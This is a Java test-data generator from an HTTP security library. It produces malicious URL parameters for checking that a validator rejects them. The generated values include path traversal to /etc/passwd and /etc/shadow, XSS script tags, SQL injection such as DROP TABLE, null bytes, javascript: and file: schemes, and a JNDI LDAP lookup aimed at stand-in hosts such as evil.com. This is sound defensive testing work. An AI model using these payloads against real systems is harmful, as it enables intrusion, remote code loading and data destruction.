/*
 * Copyright © 2025 CUI-OpenSource-Software (info@cuioss.de)
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package de.cuioss.tools.security.http.generators.url;

import de.cuioss.test.generator.Generators;
import de.cuioss.test.generator.TypedGenerator;
import de.cuioss.tools.security.http.data.URLParameter;

/**
 * Generates malicious URLParameter records for testing security validation.
 * 
 * This generator produces only attack patterns and malicious URL parameter data that should be
 * rejected by security validation systems. It complements ValidURLParameterGenerator
 * which generates legitimate patterns.
 * 
 * FRAMEWORK COMPLIANT: Uses seed-based generation without call-counter anti-pattern.
 * Reproducibility = f(seed), not f(internal_state).
 * 
 * Implements: Task G7 (Attack Cases) from HTTP verification specification
 */
public class AttackURLParameterGenerator implements TypedGenerator<URLParameter> {

    // Core generation parameters - all seed-based, no internal state
    private final TypedGenerator<Integer> attackTypeGenerator = Generators.integers(0, 3);
    private final TypedGenerator<String> systemPaths = Generators.fixedValues("etc/passwd", "windows/win.ini", "root");
    private final TypedGenerator<String> scriptTags = Generators.fixedValues("script", "img", "iframe", "style");
    private final TypedGenerator<String> sqlCommands = Generators.fixedValues("DROP TABLE", "DELETE FROM", "INSERT INTO");
    private final TypedGenerator<String> tableNames = Generators.fixedValues("users", "admin", "accounts", "sessions");
    private final TypedGenerator<String> maliciousDomains = Generators.fixedValues("evil.com", "attacker.net", "malicious.org");
    private final TypedGenerator<String> protocolSchemes = Generators.fixedValues("javascript", "file", "data");
    private final TypedGenerator<Boolean> contextSelector = Generators.booleans();
    private final TypedGenerator<Integer> mediumStringSize = Generators.integers(10, 30);
    private final TypedGenerator<Integer> longStringSize = Generators.integers(100, 200);
    private final TypedGenerator<Integer> attackStringSize = Generators.integers(50, 200);
    private final TypedGenerator<Integer> veryLongStringSize = Generators.integers(500, 1000);

    @Override
    public URLParameter next() {
        int attackType = attackTypeGenerator.next();

        String name = switch (attackType) {
            case 0 -> generateMaliciousParameterName();
            case 1 -> generateSpecialCharParameterName();
            case 2 -> generateEncodedParameterName();
            case 3 -> generateVeryLongParameterName();
            default -> generateMaliciousParameterName();
        };

        String value = generateAttackValue();

        return new URLParameter(name, value);
    }

    private String generateMaliciousParameterName() {
        int nameType = Generators.integers(0, 7).next();
        return switch (nameType) {
            case 0 -> ""; // Empty name
            case 1 -> "   "; // Whitespace name
            case 2 -> "param with spaces";
            case 3 -> "param=equals";
            case 4 -> "param&ampersand";
            case 5 -> "param#hash";
            case 6 -> "param[bracket]";
            case 7 -> "param{brace}";
            default -> "";
        };
    }

    private String generateSpecialCharParameterName() {
        int charType = Generators.integers(0, 4).next();
        return switch (charType) {
            case 0 -> "param|pipe";
            case 1 -> "param/slash";
            case 2 -> "param\\backslash";
            case 3 -> "param?question";
            case 4 -> "param:colon";
            default -> "param|pipe";
        };
    }

    private String generateEncodedParameterName() {
        int encodingType = Generators.integers(0, 2).next();
        return switch (encodingType) {
            case 0 -> "param%20encoded";
            case 1 -> "param%00null";
            case 2 -> "param%2e%2e%2f";
            default -> "param%20encoded";
        };
    }

    private String generateVeryLongParameterName() {
        String prefix = "very_long_parameter_name_";
        int size = longStringSize.next();
        return prefix + Generators.letterStrings(size, size + 100).next();
    }

    private String generateAttackValue() {
        int attackType = Generators.integers(0, 8).next();
        return switch (attackType) {
            case 0 -> generatePathTraversalAttack();
            case 1 -> generateXSSAttack();
            case 2 -> generateSQLInjectionAttack();
            case 3 -> generateNullByteAttack();
            case 4 -> generateJNDIAttack();
            case 5 -> generateProtocolAttack();
            case 6 -> generateLongStringAttack();
            case 7 -> generateVeryLongStringAttack();
            case 8 -> generateFilePathAttack();
            default -> generateXSSAttack();
        };
    }

    private String generatePathTraversalAttack() {
        int depth = Generators.integers(2, 5).next();
        StringBuilder path = new StringBuilder();
        for (int i = 0; i < depth; i++) {
            path.append("../");
        }
        path.append(systemPaths.next());
        return path.toString();
    }

    private String generateXSSAttack() {
        String tag = scriptTags.next();
        int payloadType = Generators.integers(0, 2).next();
        String payload = switch (payloadType) {
            case 0 -> "alert('xss')";
            case 1 -> "alert(1)";
            case 2 -> "prompt(1)";
            default -> "alert(1)";
        };
        return "<" + tag + ">" + payload + "</" + tag + ">";
    }

    private String generateSQLInjectionAttack() {
        String command = sqlCommands.next();
        String table = tableNames.next();
        return "'; " + command + " " + table + "; --";
    }

    private String generateNullByteAttack() {
        int nullByteType = Generators.integers(0, 1).next();
        return switch (nullByteType) {
            case 0 -> "%00";
            case 1 -> "\u0000";
            default -> "%00";
        };
    }

    private String generateJNDIAttack() {
        String domain = maliciousDomains.next();
        return "${jndi:ldap://" + domain + "/}";
    }

    private String generateProtocolAttack() {
        String protocol = protocolSchemes.next();
        String payload = switch (protocol) {
            case "javascript" -> "alert(1)";
            case "file" -> "///etc/passwd";
            case "data" -> "text/html,<script>alert(1)</script>";
            default -> "alert(1)";
        };
        return protocol + ":" + payload;
    }

    private String generateLongStringAttack() {
        int size = attackStringSize.next();
        return Generators.strings("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789", size, size + 150).next();
    }

    private String generateVeryLongStringAttack() {
        int size = veryLongStringSize.next();
        return Generators.strings("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789", size, size + 500).next();
    }

    private String generateFilePathAttack() {
        int pathType = Generators.integers(0, 2).next();
        return switch (pathType) {
            case 0 -> "../../../root";
            case 1 -> "..\\..\\windows\\system32";
            case 2 -> "/etc/shadow";
            default -> "../../../root";
        };
    }

    @Override
    public Class<URLParameter> getType() {
        return URLParameter.class;
    }
}